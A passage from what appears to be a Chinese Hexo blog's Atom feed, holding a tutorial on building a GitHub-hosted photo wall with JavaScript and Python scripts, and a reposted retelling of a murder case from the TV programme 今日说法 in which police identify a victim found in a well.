-    <content type="html"><![CDATA[<h1 id="1、关于"><a href="#1、关于" class="headerlink" title="1、关于"></a>1、关于</h1><p>其实yilia主题的博主的blog是有一个相册功能的，源码在他的github上，但是用的是Instagram的api接口，网上好多人说ins的api已经关闭了，那么也就获取不了照片信息了。所以还是决定选择从本地上传图片到github做图片墙。参考原博在</p><blockquote><p><a href="http://blog.csdn.net/u013082989/article/details/70162293" target="_blank" rel="noopener">http://blog.csdn.net/u013082989/article/details/70162293</a>  </p></blockquote><p><img src="https://ss3.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/image/h%3D300/sign=a23013e971cb0a469a228d395b62f63e/7dd98d1001e939018ffc7c2d71ec54e736d19623.jpg" alt=""></p><a id="more"></a><h1 id="2、方案"><a href="#2、方案" class="headerlink" title="2、方案"></a>2、方案</h1><ul><li>在github上新建一个仓库，主要用于存储图片，可以通过url访问到，也方便管理</li></ul><ul><li><p>将要放到相册的图片处理成json格式的数据，然后进行访问，这里json的格式需要配</p></li><li><p>合要使用的样式，所以需要处理成特定格式的json数据，下面会给出</p></li></ul><ul><li>图片裁剪，因为相册显示的样式最好是正方形的的图片，这里使用脚本处理一下</li></ul><ul><li>图片压缩，相册显示的图片是压缩后的图片，提高加载的速度，打开后的图片是原图。  </li></ul><h1 id="3、实现"><a href="#3、实现" class="headerlink" title="3、实现"></a>3、实现</h1><ul><li>在git上新建一个仓库来存储照片，样式文件参考<a href="https://github.com/lawlite19/Blog-Back-Up" target="_blank" rel="noopener">lawlite19</a>的github。</li><li><p>修改ins.js文件，其中的url对应到你的github放图片的地址（就是打开github上的照片时显示的网址信息）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ulTmpl = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>, len2 = res.list.length; j &lt; len2; j++) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = res.list[j].arr;</span><br><span class="line">    <span class="keyword">var</span> liTmpl = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = data.link.length; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> minSrc = <span class="string">'https://raw.githubusercontent.com/lawlite19/blog-back-up/master/min_photos/'</span> + data.link[i];</span><br><span class="line">      <span class="keyword">var</span> src = <span class="string">'https://raw.githubusercontent.com/lawlite19/blog-back-up/master/photos/'</span> + data.link[i];</span><br><span class="line">      <span class="keyword">var</span> type = data.type[i];</span><br><span class="line">      <span class="keyword">var</span> target = src + (type === <span class="string">'video'</span> ? <span class="string">'.mp4'</span> : <span class="string">'.jpg'</span>);</span><br><span class="line">      src += <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">      liTmpl += <span class="string">'&lt;figure class="thumb" itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"&gt;\</span></span><br><span class="line"><span class="string">            &lt;a href="'</span> + src + <span class="string">'" itemprop="contentUrl" data-size="1080x1080" data-type="'</span> + type + <span class="string">'" data-target="'</span> + src + <span class="string">'"&gt;\</span></span><br><span class="line"><span class="string">              &lt;img class="reward-img" data-type="'</span> + type + <span class="string">'" data-src="'</span> + minSrc + <span class="string">'" src="/assets/img/empty.png" itemprop="thumbnail" onload="lzld(this)"&gt;\</span></span><br><span class="line"><span class="string">            &lt;/a&gt;\</span></span><br><span class="line"><span class="string">            &lt;figcaption style="display:none" itemprop="caption description"&gt;'</span> + data.text[i] + <span class="string">'&lt;/figcaption&gt;\</span></span><br><span class="line"><span class="string">        &lt;/figure&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ulTmpl = ulTmpl + <span class="string">'&lt;section class="archives album"&gt;&lt;h1 class="year"&gt;'</span> + data.year + <span class="string">'年&lt;em&gt;'</span> + data.month + <span class="string">'月&lt;/em&gt;&lt;/h1&gt;\</span></span><br><span class="line"><span class="string">    &lt;ul class="img-box-ul"&gt;'</span> + liTmpl + <span class="string">'&lt;/ul&gt;\</span></span><br><span class="line"><span class="string">    &lt;/section&gt;'</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>源码的<strong>Blog-Back-Up</strong>里面包含图片的python处理脚本文件<strong>tool.py</strong>，可以去图片的中间部分，裁剪为正方形。</p><ul><li>处理完成之后可以将处理后的图片提交到github上，需要输入github的账号信息。</li><li>然后将图片信息处理成json数据格式<br><img src="http://img.blog.csdn.net/20170413212556724?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzA4Mjk4OQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="">  </li><li>这里采用的方式是读取图片的名字作为其中的text的内容，最前面是日期，然后用<em>进行分隔，后面是图片的描述信息，注意不要包含</em>和.符号。<br><img src="http://img.blog.csdn.net/20170413212609912?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzA4Mjk4OQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="">  </li><li>注意代码中../lawlite19.github.io/source/photos/data.json要根据需要改成自己博客的路径，另外，我的环境是我windows，编码方式是gbk,直接提取图片命名会报错，所以对于file_list要先解码GBK然后再utf8编码。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def handle_photo():</span><br><span class="line">    <span class="string">''</span><span class="string">'根据图片的文件名处理成需要的json格式的数据</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    -----------</span></span><br><span class="line"><span class="string">    最后将data.json文件存到博客的source/photos文件夹下</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    src_dir, des_dir = <span class="string">"photos/"</span>, <span class="string">"min_photos/"</span></span><br><span class="line">    file_list = list_img_file(src_dir)</span><br><span class="line">    list_info = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(file_list)):</span><br><span class="line">        filename = file_list[i].decode(<span class="string">'gbk'</span>).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        date_str, info = filename.split(<span class="string">"_"</span>)</span><br><span class="line">        info, _ = info.split(<span class="string">"."</span>)</span><br><span class="line">        date = datetime.strptime(date_str, <span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">        year_month = date_str[<span class="number">0</span>:<span class="number">7</span>]            </span><br><span class="line">        if i == 0:  # 处理第一个文件</span><br><span class="line">            new_dict = &#123;<span class="string">"date"</span>: year_month, <span class="string">"arr"</span>:&#123;<span class="string">'year'</span>: date.year,</span><br><span class="line">                                                                   <span class="string">'month'</span>: date.month,</span><br><span class="line">                                                                   <span class="string">'link'</span>: [filename],</span><br><span class="line">                                                                   <span class="string">'text'</span>: [info],</span><br><span class="line">                                                                   <span class="string">'type'</span>: [<span class="string">'image'</span>]</span><br><span class="line">                                                                   &#125;</span><br><span class="line">                                        &#125; </span><br><span class="line">            list_info.append(new_dict)</span><br><span class="line">        elif year_month != list_info[-1]['date']:  # 不是最后的一个日期，就新建一个dict</span><br><span class="line">            new_dict = &#123;<span class="string">"date"</span>: year_month, <span class="string">"arr"</span>:&#123;<span class="string">'year'</span>: date.year,</span><br><span class="line">                                                   <span class="string">'month'</span>: date.month,</span><br><span class="line">                                                   <span class="string">'link'</span>: [filename],</span><br><span class="line">                                                   <span class="string">'text'</span>: [info],</span><br><span class="line">                                                   <span class="string">'type'</span>: [<span class="string">'image'</span>]</span><br><span class="line">                                                   &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">            list_info.append(new_dict)</span><br><span class="line">        else:  # 同一个日期</span><br><span class="line">            list_info[<span class="number">-1</span>][<span class="string">'arr'</span>][<span class="string">'link'</span>].append(filename)</span><br><span class="line">            list_info[<span class="number">-1</span>][<span class="string">'arr'</span>][<span class="string">'text'</span>].append(info)</span><br><span class="line">            list_info[<span class="number">-1</span>][<span class="string">'arr'</span>][<span class="string">'type'</span>].append(<span class="string">'image'</span>)</span><br><span class="line">    list_info.reverse()  # 翻转</span><br><span class="line">    final_dict = &#123;<span class="string">"list"</span>: list_info&#125;</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"../../git/source/photos/data.json"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        json.dump(final_dict, fp)</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;1、关于&quot;&gt;&lt;a href=&quot;#1、关于&quot; class=&quot;headerlink&quot; title=&quot;1、关于&quot;&gt;&lt;/a&gt;1、关于&lt;/h1&gt;&lt;p&gt;其实yilia主题的博主的blog是有一个相册功能的，源码在他的github上，但是用的是Instagram的api接口，网上好多人说ins的api已经关闭了，那么也就获取不了照片信息了。所以还是决定选择从本地上传图片到github做图片墙。参考原博在&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/u013082989/article/details/70162293&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.csdn.net/u013082989/article/details/70162293&lt;/a&gt;  &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&quot;https://ss3.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/image/h%3D300/sign=a23013e971cb0a469a228d395b62f63e/7dd98d1001e939018ffc7c2d71ec54e736d19623.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="Hexo美化" scheme="http://yoursite.com/tags/Hexo%E7%BE%8E%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[摘]《今日说法》里最悬疑复杂的一案</title>
-    <link href="http://yoursite.com/2017/11/22/zl-jinrishuofa-xuanyi/"/>
-    <id>http://yoursite.com/2017/11/22/zl-jinrishuofa-xuanyi/</id>
-    <published>2017-11-22T04:37:19.000Z</published>
-    <updated>2017-12-01T02:35:20.571Z</updated>
-    
-    <content type="html"><![CDATA[<p>###原创 2017-11-19 李铃铛 大李吃西瓜###<br>周末愉快~今天我们这里降温了，冷的不行，在全国各地的大家也注意防寒保暖，健健康康！<br>今天来818《今日说法》里我感觉最悬疑最复杂的一案，每次想到都觉得心中一紧，在破案的警方看来，也是他们一生中很难遇到的案件。</p><p><img src="http://i1.bvimg.com/620384/e46ff774472b0e56.png" alt="">  </p><p>就是这部：</p><center><font color="#B22222" size="5" face="黑体">《烟锁殡仪馆》</font></center><a id="more"></a><p>在2010年7月13日，在山东省商河县孙集乡，一口机井里，有人发现了一具<strong><strong>全裸的男尸</strong></strong>。</p><p>这个尸体被塞在井里，头在下，脚在上，尸体已经高度腐烂，脸上没有肉了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAiaH8KEfcrYYRNuTFDEpOwX7doudyoZBN70wbhNibTHKXI79s9mNJmOUA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>尸检出这个死者身高183，体重约90公斤，30-40岁之间，死亡时间预计在3个月至1年之前。</p><p>这个井口非常小，直径只有33cm，这个尸体几乎是被人硬塞进去的。</p><p>死亡原因是被钝器打击头骨，他的面骨被打到骨折，<strong><strong>无法用图像还原人物外貌</strong></strong>。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA0HlPWPmBDDicGPaThldZiaa8X5bDHzmiauaRqKLeLaG1dib2yGFpTUiag6g/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMPLVjJib8ozqWaA8uQspibC98fjFLIgqAS0hgAoic4iaUDAqnC8rJibj71A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA5zRicEH97FHicc93zSBicI9ia5Deg9pggbMib8XniadhYXibhvnpYibFicnnkPA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>因为是全裸，所以没有可以辨识他身份的东西。</p><p>他没有犯罪记录，也没有指纹登记。    </p><p>这个人是谁？</p><p>这成了警方第一件要确定的事情。</p><p>几乎在所有的案件里，确定<strong><strong>死者身份</strong></strong>，才能根据他的社会关系进一步破案，如果找不到他是谁，那真是无从查起。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAkNX5EC8T879g5uvU8JC0MFjaevCf1Pnt6FCkpIX8ibCG3k9AgBYiaMiaQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>再说现场环境。</p><p>这口井在离孙集乡王市村大约4、5公里的地方，这口井平时没什么人知道，包括种地的人也只是在没水了才想起来这还有口井。</p><p>井周围是一片草地，案发已经超过半年，经历了下雨等环境影响，四周也找不到有效的线索，没有脚印，没有遗留的衣物纤维，基本上什么都没有。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2V4XytonuSmh5wG00zfr7nkmDNNicpXiaToOcz3FglGv4yxlX7hicoccw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>唯一的好消息是，<strong><strong>凶器</strong></strong>找到了。</p><p>就在这个机井下，警方发现了一把斧子。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAG6P1H3m2JOYUlMIJicGAHSBcpOs3WXhia9GXxRbAibw3ia33ojYhNFYCgg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>但是，这个斧子上没有血迹和指纹，并不能直接的给出什么线索。</p><p>于是警方又开始分析这个斧子，他们发现斧子木柄和锤头有加固片，并不是一般家用的，怀疑这就是买来作案用的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAaicCMLcQsIe9iaeW7GunKs26MwxsIdlH8QC5oH2X86wgR0dKhDbRy6vg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAcEiadJwsS4yS6ic0FGRxWUosyVWlZQd5onjsTq2GaeO5YSOSNtWnNsDg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMLTp6wlHMdQzSz8K1aKg0J2LL9XY8ot82vlPse0m9gmrLs7D6MzX4w/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""></p><p>于是走访商河五金店，最后找到了卖斧子的商店。</p><p>老板已经不记得谁买了，一共卖出去13把，她只能提供进货时间是2009年12月底。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAU8M1cnLySo2riaI4djMdicMoboBjM3K5QiavFxCF60M04ibbOl2kdW1jRg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>警方通过走访，有村民提供线索，2010年1月28日左右，有人发现机井附近看见过<strong><strong>红色的血迹</strong></strong>。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAQOgwuucbOaNciaaONbazLrrARJc8p8nic9sE1AqLJiaL6PMW39CpBw1Pw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAiagCcc6icwTR1td6cLo3v9VGUufLmcgs6Tx2CthrxatBibIP6Pynw3cRQ/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>于是警方把时间限制在2010年1月份失踪人口。</p><p>他们先从孙集乡开始查，查出有<strong><strong>17个失踪人口</strong></strong>，但是通过对比，却一个也不符合死者的条件。于是他们扩大了范围，甚至排查到山东失踪人口，全国失踪人口登记库，也没有符合的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtArd4U0AJSaib1FTm9VFqkDWLmbtFBmhnGYjLCucfpArVvCvwpFcGrcYQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAaGPkvRSB6k8tOIreTEvaGj83dERaWPnDznoZDnycrAej5IBpCVL1gw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>那么，死者可能不是本地人口，但是衣服都被脱掉，说明可能是在商河生活过的外地人，因为怕有人认出他，凶手才拿走了他的衣服，抛尸在机井。</p><p>但是这个范围太大了，他们走访探查，毫无线索。</p><p>想从死者身上下手破案的方式，行不通了。</p><p>看到这里，感觉这个案件就已经到死路了，破不了了，死者都不知道是谁，怎么破？</p><p>警方转变思路非常强大。</p><p>刑侦组翻查案件资料，开始注意到孙集乡失踪的17个人，其中有一个人的失踪时间，和这具尸体死亡时间很靠近，一个在一月份死亡，一个在三月份失踪。</p><p>这个在孙集乡失踪的本地人，叫王希元，是一个养鸡场的老板。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA2MPyDVJajRffDp4hd54iagZBuBA67fjI00pKPAB9revicohE24F7ghyA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAQoasI2MUVTicR2dzAD4VOyObEnf0ICoDB2XaJAiahKCEcAZmSr4QGh0g/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAjibI3iamSUPYHGhiaoxKicsbpIrfrtgz9U7oAO75nQfF7iaBXuo2OuUhFCg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtASPA95fpjbjiaguvapl8Sib1FkXJdml1pIibdW2gAAJtgmOtt3UJE6P7mw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>他身高只有165，体格瘦小，明显并<strong><strong>不是死者</strong></strong>。</p><p>能把183的死者头朝下塞到井里的，说明凶手至少也是一个相当魁梧的人，这个王希元，也<strong><strong>不是凶手</strong></strong>。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAT8Km8v1YhnTJQ01BolbHzywsiaicW5xzHyYeWSiaRCQNyo52XvYMHQFgg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtADBCTB9UcJiaDCYdkN5SIqVibDYoKE5wdSls2v82icGJicdKQuDFnqy0w0g/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>但是这个王希元身上有件蹊跷的事情，他死亡前，把他买了只有半年的小汽车送到修理厂<strong><strong>整车喷漆</strong></strong>。</p><p>一听到整车喷漆，感觉就是运送尸体毁尸灭迹的节奏啊！</p><p>警方赶紧和法医去看这个车，因为王希元失踪了，车一直在修理厂。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAr9DS3ZKVG5QKLoVtnDJ4dIezlGlVmT33bnDEv83r9LpmnAkLdgq6XQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>在这个汽车上，发现了重要线索！</p><p>什么线索呢？</p><p>汽车车尾箱有一片落叶，落叶上有一个红点。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAAWjevVPUKkBbPCRKmEMQuibVsREdic9EcHHzkat4ooEkA7iawr2ICx5Bg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>一片落叶上的红点，微小的几乎看不见，这个车做了喷漆，普通人会直接认为是油漆，但是警方仔细看，发现如果是油漆，那应该是硬的，但是<strong><strong>这个红点没有发硬</strong></strong>，怀疑是血液。</p><p>于是法医提取分析，确定了这个血液和无名死者的血液是一样的！</p><p><strong><strong>这个车就装过死者！</strong></strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAS4OvAYDHRia5Qnvax3Mh0znu4jib0AiajW20Onln9GwXrlS1b7gzAeyUA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>这下死者和失踪的王希元就联系起来了。</p><p>警方马上开始查王希元，发现他1月份的时候，频繁给天津两个手机打电话，其中一个电话，在<strong><strong>1月24日之后关机</strong></strong>。他们又联系了天津警方，找到了这两个电话的持有人。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtACVhgE6lQDFDE13AOq4AzIFib4tGib1mIlYdKf2bWxysc8b7zfRIdLu3A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAMO3HVAfKIQcScJhVyepnWmBs5NY87csVnicWlCDlbnMUAqWOBZVqM8A/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>这两个人，那个电话关机的叫<strong><strong>韩本立</strong></strong>，一个叫<strong><strong>韩宝山</strong></strong>。</p><p>两个人是天津老乡，他们半年多前出去打工，刚好是案发时间，后来就和家里断了联系。</p><p>韩本立家人因为24号之后联系不上韩本立，还问过韩宝山，韩宝山说看见过韩本立，韩本立说去其他地方打工了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtANsSiaaJp44tylDia0ib1KA74mnz8YbgKGGDNDf8SXbuo1iaaHnKHmRDhfA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>其中这个韩本立，<strong><strong>身高183</strong></strong>，很符合死者身份。</p><p>警方找到他家里，DNA一对比，果然，这个天津人韩本立就是死者！</p><p>这下终于确定了<strong><strong>死者的身份</strong></strong>。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAeGFTkFGzL05iasn9NVmYGgtYvMB6zztbM5EOCEmA32EAN162BX5fqqw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAfvkMdDvQMx09Dmcfehl1cAHhRQobJWLVd0nayictwjoszkGSOSfX7Xg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>他们找到了另一位电话持有人韩宝山，开始审讯他和韩本立的情况，根据电话关机和家人线索，韩本立的死亡时间，是1月24日，可韩宝山怎么说24号后还见过他呢？</p><p>韩宝山在说谎。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJRYuecjyHe81sbe34tNykwOXmwzo03x6z0DHyGwMD43jWIjUalGQGA/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtA9r1gu04JnKzv5qZjzpOMGZGpKicIyEx9b13t40Jbw729pmHeVFXDfQw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>韩宝山在警方的审问中，交待了犯罪事实，是他，<strong><strong>杀害了韩本立</strong></strong>！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAP5OqmBXrvOSxuMNNPWTU0HVSzk9Qgd1IGASzWbSZbXxnIibyLVYm9Wg/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>他为什么杀韩本立呢？</p><p>剧情到这里玄幻了！</p><p>原来韩宝山和韩本立，最初都是失踪的王希元雇来杀人，给他们10万块钱，让他们去杀一个叫<strong><strong>张本岭</strong></strong>的人。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAtMaDjia7VRCFfnFfACG9kRhqhsUF8UaKTJeHsmNwj2ia60RicJE6S6K2Q/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAXmLOjT4rZelviaJgft0ic8FibMzdXOMp69tnOruw8ouT4ibfwHwlwEmvdw/640?wx_fmt=jpeg&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>他们尝试过在张本岭的车<strong><strong>放炸药</strong></strong>，制造车祸，但是都失败了，炸药提前爆炸，张本岭逃过一劫。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAD8AlWlnZvv9uwkXQjIOHo54LVGYicUXnXfLQrFKnSY8hHF4IjRWGLCg/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>然后韩宝山接到王希元的要求，让他把韩本立杀了，他就可以获得两个人的钱！</p><p>总之，他必须要<strong><strong>杀一个人</strong></strong>。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAf0cWIYTddQEpapk8U5cs1IxY75qMPVG45KhXxplMibAKle5tR81DkOQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAyEjwtKE67k55iblqZ1mdk7dI4pC1QgCOibtXUKbovm6FlMryJWYIShUQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  </p><p>现在已经不知道王希元怎么会提出那么奇怪的条件，大约是他觉得钱花了，没人死，不值得吧。</p><p>残忍的人的想法，真是我们难以理解的。</p><p>韩宝山考虑后，为了钱决定<strong><strong>杀掉韩本立</strong></strong>，他拿着两人，买来想暗杀张本岭的斧子，砍向了韩本立……</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/qMaOJUia5ZBEM5y1s31A8G3vdoK9TWbtAJWh35cI7dMOFyibrMTIDnpv5QvibpFdYGmEeXHjNVoSRxS0UzmyKbjYw/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1" alt="">  